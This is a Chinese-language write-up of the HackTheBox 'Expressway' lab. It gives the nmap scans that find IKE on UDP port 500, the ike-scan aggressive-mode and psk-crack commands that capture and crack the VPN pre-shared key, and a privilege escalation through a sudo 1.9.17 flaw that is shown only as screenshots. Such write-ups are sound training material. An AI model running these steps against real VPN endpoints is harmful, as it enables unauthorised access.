---
title: HTB-Expressway WriteUp
published: 2025-10-29
description: HackTheBox Expressway 通关记录。
image: http://imgur.41an.com/picgo/2025-10/app.hackthebox.com_machines_Expressway-1761730456958.png
tags:
  - Penetration
  - PrivEsc
  - Linux
category: 打靶日记
draft: false
lang: zh_CN
---
## 1. Recon
tcp 扫描没发现什么有价值的信息
```shell
/usr/lib/nmap/nmap -sT -min-rates 10000 10.10.11.87 -Pn 
...

PORT   STATE SERVICE
22/tcp open  ssh
```
尝试 udp 扫描，发现开着 500 端口
```shell
/usr/lib/nmap/nmap -sU --top-ports 20 10.10.11.87
...

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open          isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
```
## 2. Foothold
尝试以野蛮模式创建通道并捕获与共享密钥 `PSK`
```shell
ike-scan -A -M --pskcrack 10.10.11.87
```

![image.png](http://imgur.41an.com/picgo/2025-10/20251029170233587-1761728556789.png)
爆破
```shell
psk-crack -d /usr/share/wordlists/rockyou.txt ./hash.txt 
```

![image.png](http://imgur.41an.com/picgo/2025-10/20251029165832726-1761728314777.png)
## 3. PrivEsc
查看 sudo 版本

![image.png](http://imgur.41an.com/picgo/2025-10/20251029171833240-1761729516463.png)
搜索 sudo 1.9.17 漏洞

![image.png](http://imgur.41an.com/picgo/2025-10/20251029171848072-1761729530353.png)
根据给出的脚本可直接提权

![image.png](http://imgur.41an.com/picgo/2025-10/20251029172111737-1761729673921.png)

---
## 4. Reference
[500udp---pentesting-ipsecike-vpn](https://book.hacktricks.wiki/zh/network-services-pentesting/ipsec-ike-vpn-pentesting.html#500udp---pentesting-ipsecike-vpn)
[IPsec/IKE VPN - Port 500/UDP](https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp)

